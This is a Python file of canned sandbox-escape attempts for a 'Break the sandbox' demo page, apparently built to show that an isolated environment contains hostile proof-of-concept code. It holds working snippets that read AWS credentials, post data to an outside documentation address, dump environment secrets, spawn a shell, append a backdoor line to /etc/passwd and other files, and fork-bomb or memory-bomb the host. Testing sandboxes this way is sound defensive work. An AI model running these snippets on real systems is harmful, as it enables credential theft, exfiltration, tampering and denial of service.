"""One-click attacks for the "Break the sandbox" page. Each runs exactly as a submitted PoC would."""

ATTACKS = {
    "steal": ("Steal AWS keys", "Read ~/.aws/credentials and print them.", '''\
import os
path = os.path.expanduser("~/.aws/credentials")
print("found credentials at", path)
print(open(path).read())
'''),
    "exfil": ("Phone home", "POST stolen data to an outside server.", '''\
import urllib.request
# 203.0.113.10 is a reserved documentation address: nothing real is ever contacted.
try:
    urllib.request.urlopen("http://203.0.113.10/collect", data=b"loot", timeout=3)
    print("exfiltrated!")
except Exception as e:
    print("upload failed:", e)
'''),
    "env": ("Hunt for API keys", "Dump every environment variable.", '''\
import os
for k, v in sorted(os.environ.items()):
    print(f"{k}={v}")
# GPG_KEY is the Python image's public release-signing fingerprint, not a secret.
hits = [k for k in os.environ if any(w in k for w in ("VULTR", "API_KEY", "TOKEN", "SECRET", "AWS", "PASSWORD"))]
print("\\nsecrets found:", hits or "none. The orchestrator's API key never enters the sandbox.")
'''),
    "shell": ("Pop a shell", "Spawn /bin/sh and look around the host.", '''\
import subprocess
out = subprocess.run(["sh", "-c", "id; hostname; ls /home /root 2>&1"], capture_output=True, text=True)
print(out.stdout, out.stderr)
'''),
    "write": ("Tamper with the system", "Overwrite system files and plant a backdoor.", '''\
for path in ["/etc/passwd", "/usr/local/lib/python3.12/os.py", "/home/triage/.bashrc", "/work/poc.py"]:
    try:
        open(path, "a").write("# backdoor\\n")
        print("WROTE", path)
    except OSError as e:
        print("blocked:", path, "->", e.strerror)
'''),
    "fork": ("Fork bomb", "Spawn processes until the machine falls over.", '''\
import os, time
n = 0
try:
    while True:
        if os.fork() == 0:
            time.sleep(3)
            os._exit(0)
        n += 1
except OSError as e:
    print(f"stopped after {n} processes: {e}")
'''),
    "memory": ("Memory bomb", "Allocate RAM until something dies.", '''\
chunks = []
while True:
    chunks.append(bytearray(64 * 1024 * 1024))
    print(f"holding {len(chunks) * 64} MB", flush=True)
'''),
    "hang": ("Run forever", "Burn CPU in an infinite loop.", '''\
print("spinning...", flush=True)
while True:
    pass
'''),
}
